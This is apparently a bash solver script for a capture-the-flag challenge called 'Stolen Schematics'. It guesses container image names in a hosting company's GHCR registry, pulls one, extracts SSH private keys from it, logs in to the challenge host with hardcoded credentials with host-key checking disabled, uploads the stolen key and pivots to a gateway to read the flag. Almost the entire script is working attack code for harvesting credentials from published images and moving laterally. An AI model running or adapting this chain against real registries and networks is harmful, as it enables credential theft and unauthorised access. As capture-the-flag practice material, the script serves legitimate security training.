#!/bin/bash
################################################################################
# Stolen Schematics - Kali Linux Complete Solution
# Usage: bash KALI_LINUX_SOLUTION.sh
################################################################################

set -e

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   STOLEN SCHEMATICS - KALI LINUX AUTOMATED SOLVER         ║"
echo "║   Challenge: Container Escape + SSH Key Extraction        ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# Configuration
INSTANCE_HOST="instance.ctf.tdho.st"
INSTANCE_PORT="32881"  # UPDATE THIS WITH YOUR INSTANCE PORT
USERNAME="player"
PASSWORD="reyalp"
GATEWAY="172.27.0.1"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Step 1: Testing common GHCR image names...${NC}"
echo ""

# List of likely image names based on challenge context
IMAGE_NAMES=(
    "ghcr.io/talldwarfhosting/mc-server:latest"
    "ghcr.io/talldwarfhosting/mc-server:v1"
    "ghcr.io/talldwarfhosting/mc-server:v0.1"
    "ghcr.io/talldwarfhosting/mc-server:old"
    "ghcr.io/talldwarfhosting/mc-server:dev"
    "ghcr.io/talldwarfhosting/minecraft-server:latest"
    "ghcr.io/talldwarfhosting/minecraft-server:v1"
    "ghcr.io/talldwarfhosting/game-server:latest"
    "ghcr.io/talldwarfhosting/game-server:v1"
    "ghcr.io/talldwarfhosting/server:latest"
    "ghcr.io/talldwarfhosting/ctf-server:v1"
)

FOUND_IMAGE=""

for IMAGE in "${IMAGE_NAMES[@]}"; do
    echo -e "${YELLOW}  [*] Trying: $IMAGE${NC}"
    
    # Try to pull the image
    if docker pull "$IMAGE" 2>&1 | grep -q "Downloaded\|up to date"; then
        echo -e "${GREEN}  [✓] SUCCESS! Found public image: $IMAGE${NC}"
        FOUND_IMAGE="$IMAGE"
        break
    elif docker pull "$IMAGE" 2>&1 | grep -q "manifest unknown\|not found"; then
        echo -e "      Image not found, trying next..."
    else
        echo -e "      Access denied or other error, trying next..."
    fi
done

if [ -z "$FOUND_IMAGE" ]; then
    echo -e "${RED}[!] ERROR: Could not find any public GHCR image${NC}"
    echo ""
    echo "Manual steps:"
    echo "1. Try accessing https://github.com/orgs/TallDwarfHosting/packages"
    echo "2. Or manually test image names with:"
    echo "   docker pull ghcr.io/talldwarfhosting/[IMAGE_NAME]:[TAG]"
    echo ""
    exit 1
fi

echo ""
echo -e "${YELLOW}[*] Step 2: Extracting SSH keys from image...${NC}"

# Extract SSH private key
echo -e "${YELLOW}  [*] Searching for SSH keys in $FOUND_IMAGE...${NC}"

# Method 1: Check /root/.ssh/
SSH_KEY=$(docker run --rm "$FOUND_IMAGE" cat /root/.ssh/id_rsa 2>/dev/null || echo "")

if [ -z "$SSH_KEY" ]; then
    # Method 2: Search entire filesystem
    echo -e "${YELLOW}  [*] Searching entire container filesystem...${NC}"
    KEY_PATHS=$(docker run --rm "$FOUND_IMAGE" find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -5)
    
    if [ -n "$KEY_PATHS" ]; then
        # Try each found key
        for KEY_PATH in $KEY_PATHS; do
            SSH_KEY=$(docker run --rm "$FOUND_IMAGE" cat "$KEY_PATH" 2>/dev/null || echo "")
            if [ -n "$SSH_KEY" ]; then
                echo -e "${GREEN}  [✓] Found SSH key at: $KEY_PATH${NC}"
                break
            fi
        done
    fi
fi

if [ -z "$SSH_KEY" ]; then
    echo -e "${RED}[!] ERROR: No SSH keys found in the image${NC}"
    echo ""
    echo "The image may contain keys in a different location. Try:"
    echo "  docker run --rm $FOUND_IMAGE find / -type f 2>/dev/null | grep -E 'key|rsa|ssh'"
    exit 1
fi

# Save the SSH key
KEY_FILE="/tmp/stolen_schematics_key_$$"
echo "$SSH_KEY" > "$KEY_FILE"
chmod 600 "$KEY_FILE"

echo -e "${GREEN}[✓] SSH key extracted and saved to: $KEY_FILE${NC}"
echo ""

# Display key fingerprint
echo -e "${YELLOW}[*] Key fingerprint:${NC}"
ssh-keygen -l -f "$KEY_FILE" 2>/dev/null || echo "  (fingerprint check skipped)"
echo ""

echo -e "${YELLOW}[*] Step 3: Connecting to challenge instance...${NC}"

# Test SSH connection to container first
echo -e "${YELLOW}  [*] Testing connection to $INSTANCE_HOST:$INSTANCE_PORT...${NC}"

sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    -p "$INSTANCE_PORT" "$USERNAME@$INSTANCE_HOST" "echo 'Connected successfully'" 2>/dev/null

if [ $? -ne 0 ]; then
    echo -e "${RED}[!] ERROR: Cannot connect to challenge instance${NC}"
    echo "Please check:"
    echo "  1. Instance is still running (8-10 min timeout)"
    echo "  2. Port number is correct: $INSTANCE_PORT"
    echo "  3. Install sshpass if missing: sudo apt install sshpass"
    exit 1
fi

echo -e "${GREEN}[✓] Connected to container${NC}"
echo ""

echo -e "${YELLOW}[*] Step 4: Uploading SSH key to container...${NC}"

# Upload the key using scp
sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no -P "$INSTANCE_PORT" \
    "$KEY_FILE" "$USERNAME@$INSTANCE_HOST:/tmp/stolen_key" 2>/dev/null

echo -e "${GREEN}[✓] Key uploaded${NC}"
echo ""

echo -e "${YELLOW}[*] Step 5: SSH from container to gateway to get flag...${NC}"
echo -e "${YELLOW}  [*] Attempting SSH to $GATEWAY with extracted key...${NC}"

# Execute the exploit chain
FLAG=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p "$INSTANCE_PORT" \
    "$USERNAME@$INSTANCE_HOST" \
    "chmod 600 /tmp/stolen_key; ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no player@$GATEWAY 'cat /etc/flag.txt 2>/dev/null || cat flag.txt 2>/dev/null || cat /flag.txt 2>/dev/null'" 2>&1)

echo ""

if echo "$FLAG" | grep -q "TDHT{"; then
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    FLAG FOUND!                            ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}$FLAG${NC}"
    echo ""
    
    # Clean up
    rm -f "$KEY_FILE"
    echo -e "${GREEN}[✓] Challenge completed successfully!${NC}"
    exit 0
else
    echo -e "${RED}[!] Flag not found. Output:${NC}"
    echo "$FLAG"
    echo ""
    
    # Troubleshooting
    echo -e "${YELLOW}[*] Troubleshooting...${NC}"
    
    # Check if gateway is reachable
    echo -e "${YELLOW}  [*] Checking if gateway is reachable...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p "$INSTANCE_PORT" \
        "$USERNAME@$INSTANCE_HOST" \
        "timeout 2 bash -c 'echo >/dev/tcp/$GATEWAY/22' 2>&1 && echo 'Gateway reachable' || echo 'Gateway not reachable'"
    
    # Try different flag locations
    echo -e "${YELLOW}  [*] Trying alternative flag locations...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p "$INSTANCE_PORT" \
        "$USERNAME@$INSTANCE_HOST" \
        "chmod 600 /tmp/stolen_key; ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no player@$GATEWAY 'find / -name flag.txt 2>/dev/null | xargs cat 2>/dev/null'"
    
    rm -f "$KEY_FILE"
    exit 1
fi
